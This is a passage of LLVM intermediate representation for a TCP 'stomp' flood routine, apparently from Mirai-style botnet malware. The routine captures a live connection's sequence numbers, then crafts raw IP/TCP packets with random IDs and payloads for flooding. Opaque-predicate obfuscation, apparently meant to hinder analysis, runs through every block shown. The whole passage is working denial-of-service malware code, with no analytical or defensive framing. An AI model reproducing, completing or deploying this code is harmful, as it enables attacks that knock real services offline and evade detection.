  %372 = load i32, i32* @y.30
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBBpart263, label %originalBB45alteredBB

originalBBpart263:                                ; preds = %originalBB45
  br i1 %370, label %379, label %620

; <label>:379:                                    ; preds = %originalBBpart263
  %380 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %381 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %380, i32 0, i32 4
  %382 = load i16, i16* %381, align 4
  %383 = lshr i16 %382, 12
  %384 = and i16 %383, 1
  %385 = zext i16 %384 to i32
  %386 = icmp ne i32 %385, 0
  br i1 %386, label %387, label %620

; <label>:387:                                    ; preds = %379
  %388 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %389 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %388, i32 0, i32 0
  %390 = load i32, i32* %389, align 4
  %391 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %392 = load i32, i32* %9, align 4
  %393 = sext i32 %392 to i64
  %394 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %391, i64 %393
  %395 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %394, i32 0, i32 0
  store i32 %390, i32* %395, align 4
  %396 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %397 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %396, i32 0, i32 2
  %398 = load i32, i32* %397, align 4
  %399 = call i32 @ntohl(i32 %398) #7
  %400 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %401 = load i32, i32* %9, align 4
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %400, i64 %402
  %404 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %403, i32 0, i32 1
  store i32 %399, i32* %404, align 4
  %405 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %406 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %405, i32 0, i32 3
  %407 = load i32, i32* %406, align 4
  %408 = call i32 @ntohl(i32 %407) #7
  %409 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %410 = load i32, i32* %9, align 4
  %411 = sext i32 %410 to i64
  %412 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %409, i64 %411
  %413 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %412, i32 0, i32 2
  store i32 %408, i32* %413, align 4
  %414 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %415 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %414, i32 0, i32 1
  %416 = load i16, i16* %415, align 2
  %417 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %418 = load i32, i32* %9, align 4
  %419 = sext i32 %418 to i64
  %420 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %417, i64 %419
  %421 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %420, i32 0, i32 3
  store i16 %416, i16* %421, align 4
  %422 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %423 = load i16, i16* %422, align 2
  %424 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %425 = load i32, i32* %9, align 4
  %426 = sext i32 %425 to i64
  %427 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %424, i64 %426
  %428 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %427, i32 0, i32 4
  store i16 %423, i16* %428, align 2
  %429 = load i32, i32* %24, align 4
  %430 = sext i32 %429 to i64
  %431 = add i64 40, %430
  %432 = call noalias i8* @malloc(i64 %431) #6
  %433 = load i8**, i8*** %12, align 8
  %434 = load i32, i32* %9, align 4
  %435 = sext i32 %434 to i64
  %436 = getelementptr inbounds i8*, i8** %433, i64 %435
  store i8* %432, i8** %436, align 8
  %437 = load i8**, i8*** %12, align 8
  %438 = load i32, i32* %9, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds i8*, i8** %437, i64 %439
  %441 = load i8*, i8** %440, align 8
  %442 = bitcast i8* %441 to %struct.iphdr*
  store %struct.iphdr* %442, %struct.iphdr** %36, align 8
  %443 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %444 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %443, i64 1
  %445 = bitcast %struct.iphdr* %444 to %struct.tcphdr*
  store %struct.tcphdr* %445, %struct.tcphdr** %37, align 8
  %446 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %447 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %446, i64 1
  %448 = bitcast %struct.tcphdr* %447 to i8*
  store i8* %448, i8** %38, align 8
  %449 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %450 = bitcast %struct.iphdr* %449 to i8*
  %451 = load i8, i8* %450, align 4
  %452 = and i8 %451, 15
  %453 = or i8 %452, 64
  store i8 %453, i8* %450, align 4
  %454 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %455 = bitcast %struct.iphdr* %454 to i8*
  %456 = load i8, i8* %455, align 4
  %457 = and i8 %456, -16
  %458 = or i8 %457, 5
  store i8 %458, i8* %455, align 4
  %459 = load i8, i8* %13, align 1
  %460 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %461 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %460, i32 0, i32 1
  store i8 %459, i8* %461, align 1
  %462 = load i32, i32* %24, align 4
  %463 = sext i32 %462 to i64
  %464 = add i64 40, %463
  %465 = trunc i64 %464 to i16
  %466 = call zeroext i16 @htons(i16 zeroext %465) #7
  %467 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %468 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %467, i32 0, i32 2
  store i16 %466, i16* %468, align 2
  %469 = load i16, i16* %14, align 2
  %470 = call zeroext i16 @htons(i16 zeroext %469) #7
  %471 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %472 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %471, i32 0, i32 3
  store i16 %470, i16* %472, align 4
  %473 = load i8, i8* %15, align 1
  %474 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %475 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %474, i32 0, i32 5
  store i8 %473, i8* %475, align 4
  %476 = load i8, i8* %16, align 1
  %477 = icmp ne i8 %476, 0
  br i1 %477, label %478, label %482

; <label>:478:                                    ; preds = %387
  %479 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %480 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %481 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %480, i32 0, i32 4
  store i16 %479, i16* %481, align 2
  br label %482

; <label>:482:                                    ; preds = %478, %387
  %483 = load i32, i32* @x.29
  %484 = load i32, i32* @y.30
  %485 = sub i32 %483, 1
  %486 = mul i32 %483, %485
  %487 = urem i32 %486, 2
  %488 = icmp eq i32 %487, 0
  %489 = icmp slt i32 %484, 10
  %490 = or i1 %488, %489
  br i1 %490, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %482
  %491 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %492 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %491, i32 0, i32 6
  store i8 6, i8* %492, align 1
  %493 = load i32, i32* @LOCAL_ADDR, align 4
  %494 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %495 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %494, i32 0, i32 8
  store i32 %493, i32* %495, align 4
  %496 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %497 = load i32, i32* %9, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %496, i64 %498
  %500 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %499, i32 0, i32 0
  %501 = load i32, i32* %500, align 4
  %502 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %503 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %502, i32 0, i32 9
  store i32 %501, i32* %503, align 4
  %504 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %505 = load i32, i32* %9, align 4
  %506 = sext i32 %505 to i64
  %507 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %504, i64 %506
  %508 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %507, i32 0, i32 3
  %509 = load i16, i16* %508, align 4
  %510 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %511 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %510, i32 0, i32 0
  store i16 %509, i16* %511, align 4
  %512 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %513 = load i32, i32* %9, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %512, i64 %514
  %516 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %515, i32 0, i32 4
  %517 = load i16, i16* %516, align 2
  %518 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %519 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %518, i32 0, i32 1
  store i16 %517, i16* %519, align 2
  %520 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %521 = load i32, i32* %9, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %520, i64 %522
  %524 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %523, i32 0, i32 2
  %525 = load i32, i32* %524, align 4
  %526 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %527 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %526, i32 0, i32 2
  store i32 %525, i32* %527, align 4
  %528 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %529 = load i32, i32* %9, align 4
  %530 = sext i32 %529 to i64
  %531 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %528, i64 %530
  %532 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %531, i32 0, i32 1
  %533 = load i32, i32* %532, align 4
  %534 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %535 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %534, i32 0, i32 3
  store i32 %533, i32* %535, align 4
  %536 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %537 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %536, i32 0, i32 4
  %538 = load i16, i16* %537, align 4
  %539 = and i16 %538, -241
  %540 = or i16 %539, 128
  store i16 %540, i16* %537, align 4
  %541 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %542 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %541, i32 0, i32 4
  %543 = load i16, i16* %542, align 4
  %544 = and i16 %543, -257
  %545 = or i16 %544, 256
  store i16 %545, i16* %542, align 4
  %546 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %547 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %546, i32 0, i32 4
  %548 = load i16, i16* %547, align 4
  %549 = and i16 %548, -4097
  %550 = or i16 %549, 4096
  store i16 %550, i16* %547, align 4
  %551 = call i32 @rand_next()
  %552 = and i32 %551, 65535
  %553 = trunc i32 %552 to i16
  %554 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %555 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %554, i32 0, i32 5
  store i16 %553, i16* %555, align 2
  %556 = load i8, i8* %18, align 1
  %557 = sext i8 %556 to i16
  %558 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %559 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %558, i32 0, i32 4
  %560 = load i16, i16* %559, align 4
  %561 = and i16 %557, 1
  %562 = shl i16 %561, 13
  %563 = and i16 %560, -8193
  %564 = or i16 %563, %562
  store i16 %564, i16* %559, align 4
  %565 = load i8, i8* %19, align 1
  %566 = sext i8 %565 to i16
  %567 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %568 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %567, i32 0, i32 4
  %569 = load i16, i16* %568, align 4
  %570 = and i16 %566, 1
  %571 = shl i16 %570, 12
  %572 = and i16 %569, -4097
  %573 = or i16 %572, %571
  store i16 %573, i16* %568, align 4
  %574 = load i8, i8* %20, align 1
  %575 = sext i8 %574 to i16
  %576 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %577 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %576, i32 0, i32 4
  %578 = load i16, i16* %577, align 4
  %579 = and i16 %575, 1
  %580 = shl i16 %579, 11
  %581 = and i16 %578, -2049
  %582 = or i16 %581, %580
  store i16 %582, i16* %577, align 4
  %583 = load i8, i8* %21, align 1
  %584 = sext i8 %583 to i16
  %585 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %586 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %585, i32 0, i32 4
  %587 = load i16, i16* %586, align 4
  %588 = and i16 %584, 1
  %589 = shl i16 %588, 10
  %590 = and i16 %587, -1025
  %591 = or i16 %590, %589
  store i16 %591, i16* %586, align 4
  %592 = load i8, i8* %22, align 1
  %593 = sext i8 %592 to i16
  %594 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %595 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %594, i32 0, i32 4
  %596 = load i16, i16* %595, align 4
  %597 = and i16 %593, 1
  %598 = shl i16 %597, 9
  %599 = and i16 %596, -513
  %600 = or i16 %599, %598
  store i16 %600, i16* %595, align 4
  %601 = load i8, i8* %23, align 1
  %602 = sext i8 %601 to i16
  %603 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %604 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %603, i32 0, i32 4
  %605 = load i16, i16* %604, align 4
  %606 = and i16 %602, 1
  %607 = shl i16 %606, 8
  %608 = and i16 %605, -257
  %609 = or i16 %608, %607
  store i16 %609, i16* %604, align 4
  %610 = load i8*, i8** %38, align 8
  %611 = load i32, i32* %24, align 4
  call void @rand_str(i8* %610, i32 %611)
  %612 = load i32, i32* @x.29
  %613 = load i32, i32* @y.30
  %614 = sub i32 %612, 1
  %615 = mul i32 %612, %614
  %616 = urem i32 %615, 2
  %617 = icmp eq i32 %616, 0
  %618 = icmp slt i32 %613, 10
  %619 = or i1 %617, %618
  br i1 %619, label %originalBBpart2275, label %originalBB65alteredBB

originalBBpart2275:                               ; preds = %originalBB65
  br label %731

; <label>:620:                                    ; preds = %379, %originalBBpart263
  %621 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %622 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %621, i32 0, i32 4
  %623 = load i16, i16* %622, align 4
  %624 = lshr i16 %623, 8
  %625 = and i16 %624, 1
  %626 = zext i16 %625 to i32
  %627 = icmp ne i32 %626, 0
  br i1 %627, label %652, label %628

; <label>:628:                                    ; preds = %620
  %629 = load i32, i32* @x.29
  %630 = load i32, i32* @y.30
  %631 = sub i32 %629, 1
  %632 = mul i32 %629, %631
  %633 = urem i32 %632, 2
  %634 = icmp eq i32 %633, 0
  %635 = icmp slt i32 %630, 10
  %636 = or i1 %634, %635
  br i1 %636, label %originalBB277, label %originalBB277alteredBB

originalBB277:                                    ; preds = %originalBB277alteredBB, %628
  %637 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %638 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %637, i32 0, i32 4
  %639 = load i16, i16* %638, align 4
  %640 = lshr i16 %639, 10
  %641 = and i16 %640, 1
  %642 = zext i16 %641 to i32
  %643 = icmp ne i32 %642, 0
  %644 = load i32, i32* @x.29
  %645 = load i32, i32* @y.30
  %646 = sub i32 %644, 1
  %647 = mul i32 %644, %646
  %648 = urem i32 %647, 2
  %649 = icmp eq i32 %648, 0
  %650 = icmp slt i32 %645, 10
  %651 = or i1 %649, %650
  br i1 %651, label %originalBBpart2289, label %originalBB277alteredBB

originalBBpart2289:                               ; preds = %originalBB277
  br i1 %643, label %652, label %671

; <label>:652:                                    ; preds = %originalBBpart2289, %620
  %653 = load i32, i32* @x.29
  %654 = load i32, i32* @y.30
  %655 = sub i32 %653, 1
  %656 = mul i32 %653, %655
  %657 = urem i32 %656, 2
  %658 = icmp eq i32 %657, 0
  %659 = icmp slt i32 %654, 10
  %660 = or i1 %658, %659
  br i1 %660, label %originalBB291, label %originalBB291alteredBB

originalBB291:                                    ; preds = %originalBB291alteredBB, %652
  %661 = load i32, i32* %26, align 4
  %662 = call i32 @close(i32 %661)
  %663 = load i32, i32* @x.29
  %664 = load i32, i32* @y.30
  %665 = sub i32 %663, 1
  %666 = mul i32 %663, %665
  %667 = urem i32 %666, 2
  %668 = icmp eq i32 %667, 0
  %669 = icmp slt i32 %664, 10
  %670 = or i1 %668, %669
  br i1 %670, label %originalBBpart2293, label %originalBB291alteredBB

originalBBpart2293:                               ; preds = %originalBB291
  br label %153

; <label>:671:                                    ; preds = %originalBBpart2289
  br label %672

; <label>:672:                                    ; preds = %671
  %673 = load i32, i32* @x.29
  %674 = load i32, i32* @y.30
  %675 = sub i32 %673, 1
  %676 = mul i32 %673, %675
  %677 = urem i32 %676, 2
  %678 = icmp eq i32 %677, 0
  %679 = icmp slt i32 %674, 10
  %680 = or i1 %678, %679
  br i1 %680, label %originalBB295, label %originalBB295alteredBB

originalBB295:                                    ; preds = %originalBB295alteredBB, %672
  %681 = load i32, i32* @x.29
  %682 = load i32, i32* @y.30
  %683 = sub i32 %681, 1
  %684 = mul i32 %681, %683
  %685 = urem i32 %684, 2
  %686 = icmp eq i32 %685, 0
  %687 = icmp slt i32 %682, 10
  %688 = or i1 %686, %687
  br i1 %688, label %originalBBpart2297, label %originalBB295alteredBB

originalBBpart2297:                               ; preds = %originalBB295
  br label %689

; <label>:689:                                    ; preds = %originalBBpart2297, %343
  br label %690

; <label>:690:                                    ; preds = %689, %339, %331
  %691 = load i32, i32* @x.29
  %692 = load i32, i32* @y.30
  %693 = sub i32 %691, 1
  %694 = mul i32 %691, %693
  %695 = urem i32 %694, 2
  %696 = icmp eq i32 %695, 0
  %697 = icmp slt i32 %692, 10
  %698 = or i1 %696, %697
  br i1 %698, label %originalBB299, label %originalBB299alteredBB

originalBB299:                                    ; preds = %originalBB299alteredBB, %690
  %699 = call i64 @time(i64* null) #6
  %700 = load i64, i64* %31, align 8
  %701 = sub nsw i64 %699, %700
  %702 = icmp sgt i64 %701, 10
  %703 = load i32, i32* @x.29
  %704 = load i32, i32* @y.30
  %705 = sub i32 %703, 1
  %706 = mul i32 %703, %705
  %707 = urem i32 %706, 2
  %708 = icmp eq i32 %707, 0
  %709 = icmp slt i32 %704, 10
  %710 = or i1 %708, %709
  br i1 %710, label %originalBBpart2311, label %originalBB299alteredBB

originalBBpart2311:                               ; preds = %originalBB299
  br i1 %702, label %711, label %730

; <label>:711:                                    ; preds = %originalBBpart2311
  %712 = load i32, i32* @x.29
  %713 = load i32, i32* @y.30
  %714 = sub i32 %712, 1
  %715 = mul i32 %712, %714
  %716 = urem i32 %715, 2
  %717 = icmp eq i32 %716, 0
  %718 = icmp slt i32 %713, 10
  %719 = or i1 %717, %718
  br i1 %719, label %originalBB313, label %originalBB313alteredBB

originalBB313:                                    ; preds = %originalBB313alteredBB, %711
  %720 = load i32, i32* %26, align 4
  %721 = call i32 @close(i32 %720)
  %722 = load i32, i32* @x.29
  %723 = load i32, i32* @y.30
  %724 = sub i32 %722, 1
  %725 = mul i32 %722, %724
  %726 = urem i32 %725, 2
  %727 = icmp eq i32 %726, 0
  %728 = icmp slt i32 %723, 10
  %729 = or i1 %727, %728
  br i1 %729, label %originalBBpart2315, label %originalBB313alteredBB

originalBBpart2315:                               ; preds = %originalBB313
  br label %153

; <label>:730:                                    ; preds = %originalBBpart2311
  br label %303

; <label>:731:                                    ; preds = %originalBBpart2275
  br label %732

; <label>:732:                                    ; preds = %731, %172
  %733 = load i32, i32* @x.29
  %734 = load i32, i32* @y.30
  %735 = sub i32 %733, 1
  %736 = mul i32 %733, %735
  %737 = urem i32 %736, 2
  %738 = icmp eq i32 %737, 0
  %739 = icmp slt i32 %734, 10
  %740 = or i1 %738, %739
  br i1 %740, label %originalBB317, label %originalBB317alteredBB

originalBB317:                                    ; preds = %originalBB317alteredBB, %732
  %741 = load i32, i32* %9, align 4
  %742 = add nsw i32 %741, 1
  store i32 %742, i32* %9, align 4
  %743 = load i32, i32* @x.29
  %744 = load i32, i32* @y.30
  %745 = sub i32 %743, 1
  %746 = mul i32 %743, %745
  %747 = urem i32 %746, 2
  %748 = icmp eq i32 %747, 0
  %749 = icmp slt i32 %744, 10
  %750 = or i1 %748, %749
  br i1 %750, label %originalBBpart2329, label %originalBB317alteredBB

originalBBpart2329:                               ; preds = %originalBB317
  br label %147

; <label>:751:                                    ; preds = %147
  br label %752

; <label>:752:                                    ; preds = %originalBBpart2377, %751
  %753 = load i32, i32* @x.29
  %754 = load i32, i32* @y.30
  %755 = sub i32 %753, 1
  %756 = mul i32 %753, %755
  %757 = urem i32 %756, 2
  %758 = icmp eq i32 %757, 0
  %759 = icmp slt i32 %754, 10
  %760 = or i1 %758, %759
  br i1 %760, label %originalBB331, label %originalBB331alteredBB

originalBB331:                                    ; preds = %originalBB331alteredBB, %752
  store i32 0, i32* %9, align 4
  %761 = load i32, i32* @x.29
  %762 = load i32, i32* @y.30
  %763 = sub i32 %761, 1
  %764 = mul i32 %761, %763
  %765 = urem i32 %764, 2
  %766 = icmp eq i32 %765, 0
  %767 = icmp slt i32 %762, 10
  %768 = or i1 %766, %767
  br i1 %768, label %originalBBpart2333, label %originalBB331alteredBB

originalBBpart2333:                               ; preds = %originalBB331
  br label %769

; <label>:769:                                    ; preds = %939, %originalBBpart2333
  %770 = load i32, i32* @x.29
  %771 = load i32, i32* @y.30
  %772 = sub i32 %770, 1
  %773 = mul i32 %770, %772
  %774 = urem i32 %773, 2
  %775 = icmp eq i32 %774, 0
  %776 = icmp slt i32 %771, 10
  %777 = or i1 %775, %776
  br i1 %777, label %originalBB335, label %originalBB335alteredBB

originalBB335:                                    ; preds = %originalBB335alteredBB, %769
  %778 = load i32, i32* %9, align 4
  %779 = load i8, i8* %5, align 1
  %780 = zext i8 %779 to i32
  %781 = icmp slt i32 %778, %780
  %782 = load i32, i32* @x.29
  %783 = load i32, i32* @y.30
  %784 = sub i32 %782, 1
  %785 = mul i32 %782, %784
  %786 = urem i32 %785, 2
  %787 = icmp eq i32 %786, 0
  %788 = icmp slt i32 %783, 10
  %789 = or i1 %787, %788
  br i1 %789, label %originalBBpart2337, label %originalBB335alteredBB

originalBBpart2337:                               ; preds = %originalBB335
  br i1 %781, label %790, label %942

; <label>:790:                                    ; preds = %originalBBpart2337
  %791 = load i32, i32* @x.29
  %792 = load i32, i32* @y.30
  %793 = sub i32 %791, 1
  %794 = mul i32 %791, %793
  %795 = urem i32 %794, 2
  %796 = icmp eq i32 %795, 0
  %797 = icmp slt i32 %792, 10
  %798 = or i1 %796, %797
  br i1 %798, label %originalBB339, label %originalBB339alteredBB

originalBB339:                                    ; preds = %originalBB339alteredBB, %790
  %799 = load i8**, i8*** %12, align 8
  %800 = load i32, i32* %9, align 4
  %801 = sext i32 %800 to i64
  %802 = getelementptr inbounds i8*, i8** %799, i64 %801
  %803 = load i8*, i8** %802, align 8
  store i8* %803, i8** %39, align 8
  %804 = load i8*, i8** %39, align 8
  %805 = bitcast i8* %804 to %struct.iphdr*
  store %struct.iphdr* %805, %struct.iphdr** %40, align 8
  %806 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %807 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %806, i64 1
  %808 = bitcast %struct.iphdr* %807 to %struct.tcphdr*
  store %struct.tcphdr* %808, %struct.tcphdr** %41, align 8
  %809 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %810 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %809, i64 1
  %811 = bitcast %struct.tcphdr* %810 to i8*
  store i8* %811, i8** %42, align 8
  %812 = load i16, i16* %14, align 2
  %813 = zext i16 %812 to i32
  %814 = icmp eq i32 %813, 65535
  %815 = load i32, i32* @x.29
  %816 = load i32, i32* @y.30
  %817 = sub i32 %815, 1
  %818 = mul i32 %815, %817
  %819 = urem i32 %818, 2
  %820 = icmp eq i32 %819, 0
  %821 = icmp slt i32 %816, 10
  %822 = or i1 %820, %821
  br i1 %822, label %originalBBpart2341, label %originalBB339alteredBB

originalBBpart2341:                               ; preds = %originalBB339
  br i1 %814, label %823, label %829

; <label>:823:                                    ; preds = %originalBBpart2341
  %824 = call i32 @rand_next()
  %825 = and i32 %824, 65535
  %826 = trunc i32 %825 to i16
  %827 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %828 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %827, i32 0, i32 3
  store i16 %826, i16* %828, align 4
  br label %829

; <label>:829:                                    ; preds = %823, %originalBBpart2341
  %830 = load i8, i8* %25, align 1
  %831 = icmp ne i8 %830, 0
  br i1 %831, label %832, label %851

; <label>:832:                                    ; preds = %829
  %833 = load i32, i32* @x.29
  %834 = load i32, i32* @y.30
  %835 = sub i32 %833, 1
  %836 = mul i32 %833, %835
  %837 = urem i32 %836, 2
  %838 = icmp eq i32 %837, 0
  %839 = icmp slt i32 %834, 10
  %840 = or i1 %838, %839
  br i1 %840, label %originalBB343, label %originalBB343alteredBB

originalBB343:                                    ; preds = %originalBB343alteredBB, %832
  %841 = load i8*, i8** %42, align 8
  %842 = load i32, i32* %24, align 4
  call void @rand_str(i8* %841, i32 %842)
  %843 = load i32, i32* @x.29
  %844 = load i32, i32* @y.30
  %845 = sub i32 %843, 1
  %846 = mul i32 %843, %845
  %847 = urem i32 %846, 2
  %848 = icmp eq i32 %847, 0
  %849 = icmp slt i32 %844, 10
  %850 = or i1 %848, %849
  br i1 %850, label %originalBBpart2345, label %originalBB343alteredBB

originalBBpart2345:                               ; preds = %originalBB343
  br label %851

; <label>:851:                                    ; preds = %originalBBpart2345, %829
  %852 = load i32, i32* @x.29
  %853 = load i32, i32* @y.30
  %854 = sub i32 %852, 1
  %855 = mul i32 %852, %854
  %856 = urem i32 %855, 2
  %857 = icmp eq i32 %856, 0
  %858 = icmp slt i32 %853, 10
  %859 = or i1 %857, %858
  br i1 %859, label %originalBB347, label %originalBB347alteredBB

originalBB347:                                    ; preds = %originalBB347alteredBB, %851
  %860 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %861 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %860, i32 0, i32 7
  store i16 0, i16* %861, align 2
  %862 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %863 = bitcast %struct.iphdr* %862 to i16*
  %864 = call zeroext i16 @checksum_generic(i16* %863, i32 20)
  %865 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %866 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %865, i32 0, i32 7
  store i16 %864, i16* %866, align 2
  %867 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %868 = load i32, i32* %9, align 4
  %869 = sext i32 %868 to i64
  %870 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %867, i64 %869
  %871 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %870, i32 0, i32 1
  %872 = load i32, i32* %871, align 4
  %873 = add i32 %872, 1
  store i32 %873, i32* %871, align 4
  %874 = trunc i32 %872 to i16
  %875 = call zeroext i16 @htons(i16 zeroext %874) #7
  %876 = zext i16 %875 to i32
  %877 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %878 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %877, i32 0, i32 2
  store i32 %876, i32* %878, align 4
  %879 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %880 = load i32, i32* %9, align 4
  %881 = sext i32 %880 to i64
  %882 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %879, i64 %881
  %883 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %882, i32 0, i32 2
  %884 = load i32, i32* %883, align 4
  %885 = trunc i32 %884 to i16
  %886 = call zeroext i16 @htons(i16 zeroext %885) #7
  %887 = zext i16 %886 to i32
  %888 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %889 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %888, i32 0, i32 3
  store i32 %887, i32* %889, align 4
  %890 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %891 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %890, i32 0, i32 6
  store i16 0, i16* %891, align 4
  %892 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %893 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %894 = bitcast %struct.tcphdr* %893 to i8*
  %895 = load i32, i32* %24, align 4
  %896 = sext i32 %895 to i64
  %897 = add i64 20, %896
  %898 = trunc i64 %897 to i16
  %899 = call zeroext i16 @htons(i16 zeroext %898) #7
  %900 = load i32, i32* %24, align 4
